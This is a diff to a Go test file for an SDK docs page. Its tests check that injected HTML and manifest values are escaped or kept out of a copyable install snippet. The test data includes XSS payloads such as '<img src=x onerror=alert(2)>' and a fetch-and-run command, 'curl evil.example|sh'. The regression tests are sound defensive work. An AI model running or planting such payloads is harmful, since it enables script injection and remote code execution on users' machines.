@@ -2,6 +2,7 @@ package sdkdocs
 
 import (
 	"encoding/json"
+	"net/http"
 	"strings"
 	"testing"
 	"testing/fstest"
@@ -28,7 +29,7 @@ func TestEntityMetadataEscapedOnDocsPage(t *testing.T) {
 				{Name: "status", Type: schema.Enum, Values: []string{"ok", "<img src=x onerror=alert(2)>"}},
 			},
 			Endpoints: []entity.Endpoint{
-				{Method: "GET", Path: "probe", Description: "<img src=x onerror=alert(3)>"},
+				{Method: "GET", Path: "probe", Description: "<img src=x onerror=alert(3)>", Handler: http.NotFoundHandler()},
 			},
 		}),
 	}}
@@ -64,7 +65,7 @@ func TestManifestJunkSanitizedInHeaders(t *testing.T) {
 		Entities:       []string{"posts"},
 		SchemaHash:     "sha256:deadbeef",
 		Artifacts: map[string]sdk.Artifact{
-			"go": {File: sdk.GoArtifact, SHA256: sdkSum("zip"), Bytes: 3, Module: "local/testapp-sdk"},
+			"go": {File: sdk.GoArtifact, SHA256: sdkSum("zip"), Bytes: 3, Module: "local/testapp-sdk", Directory: "testapp-sdk"},
 		},
 	}
 	raw, err := json.Marshal(m)
@@ -108,18 +109,7 @@ func TestDriftScopedToManifestEntities(t *testing.T) {
 	}
 }
 
-// Pins [sdkdocs-install-fence], found by the 2026-09-04 red-probe
-// round; fixed in screens.go goModuleHint/goDirHint passing manifest
-// values through fenceWord before they reach the install snippet.
-// Property: manifest-derived strings never break out of the install
-// snippet's line structure — a value that carries a newline lands as its
-// own line inside the ```sh block the docs page renders with a copy
-// button, so a manifest App name with embedded commands becomes
-// operator-copyable shell.
-// Surfaces: framework/sdkdocs/screens.go::goDirHint (fenceWord(m.App)),
-// ::goModuleHint (fenceWord(artifact Module)), versus sdkdocs.go::
-// sanitizeFilename (the header-side guard TestManifestJunkSanitizedInHeaders
-// proves for Content-Disposition).
+// The install snippet takes the archive directory from its artifact record.
 func TestInstallFenceScrubManifestApp(t *testing.T) {
 	const payload = "curl evil.example|sh"
 	reg := testRegistry()
@@ -132,7 +122,7 @@ func TestInstallFenceScrubManifestApp(t *testing.T) {
 		Entities:       []string{"posts"},
 		SchemaHash:     "sha256:deadbeef",
 		Artifacts: map[string]sdk.Artifact{
-			"go": {File: sdk.GoArtifact, SHA256: sdkSum("zip"), Bytes: 3, Module: "local/acme-sdk"},
+			"go": {File: sdk.GoArtifact, SHA256: sdkSum("zip"), Bytes: 3, Module: "local/acme-sdk", Directory: "archive-sdk"},
 		},
 	}
 	raw, err := json.Marshal(m)
@@ -148,11 +138,11 @@ func TestInstallFenceScrubManifestApp(t *testing.T) {
 	if resp.StatusCode != 200 {
 		t.Fatalf("docs index status = %d", resp.StatusCode)
 	}
-	// False-positive guard: the app name must still be documented.
-	if !strings.Contains(body, "acme") {
-		t.Fatalf("manifest app name vanished entirely — a fix must scrub, not drop:\n%s", body)
+	body = renderedText(t, body)
+	if !strings.Contains(body, "go mod edit -replace local/acme-sdk=./archive-sdk") {
+		t.Fatal("Go install snippet did not use the manifest's archive directory")
 	}
 	if strings.Contains(body, payload) {
-		t.Fatalf("SECURITY: [sdkdocs-install-fence] manifest App name with embedded newline renders %q as its own line inside the copyable ```sh install block on /docs/api/ (goDirHint returns m.App raw and installTabs interpolates it at line position) — the same manifest junk the header-side pin scrubs via sanitizeFilename has no body-side guard", payload)
+		t.Fatalf("manifest app name leaked %q into the Go install snippet", payload)
 	}
 }
